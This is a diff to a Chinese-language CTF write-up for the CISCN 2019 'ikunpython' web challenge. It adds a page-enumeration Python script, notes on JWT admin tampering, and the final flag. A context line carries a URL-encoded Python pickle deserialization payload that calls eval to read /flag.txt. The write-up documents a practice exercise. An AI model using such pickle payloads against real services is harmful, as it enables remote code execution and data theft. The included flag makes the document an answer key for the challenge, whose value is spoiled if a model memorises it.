@@ -9,8 +9,20 @@
 1.查看页面源码，发现提示
 
 ![image-hint](../images/ikun-hint.png)
+页面提示“爆破*站：资金募集 11540.0
+ikun们冲鸭,一定要买到lv6!!!”
 
-浏览页面，找到level 6的页面 181，
+先通过代码找到lv6
+```python
+import requests
+for i in range(200):
+    url='http://a6d3ddb8-6b69-4a87-ba44-ed25aa0a0cee.node5.buuoj.cn:81/shop?page='+str(i)
+    result=requests.get(url).text
+    if '/static/img/lv/lv6.png' in result:
+        print (url)
+```
+http://a6d3ddb8-6b69-4a87-ba44-ed25aa0a0cee.node5.buuoj.cn:81/shop?page=181
+找到level 6的页面 181，
 
 下单，修改优惠比例，提示admin才行，查看页面请求，得到jwt token
 
@@ -92,5 +104,8 @@ c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29
 ![ikun-decome-bp](../images/ikun-decome-bp.png)
 
 
-
+# 得出
 flag{69f0688e-9ae0-4f82-a181-ad455a7a8fd1}
+
+# 参考
+https://guokeya.github.io/post/ciscn2019-hua-bei-sai-qu-day1-web2ikunpython-fan-xu-lie-hua/
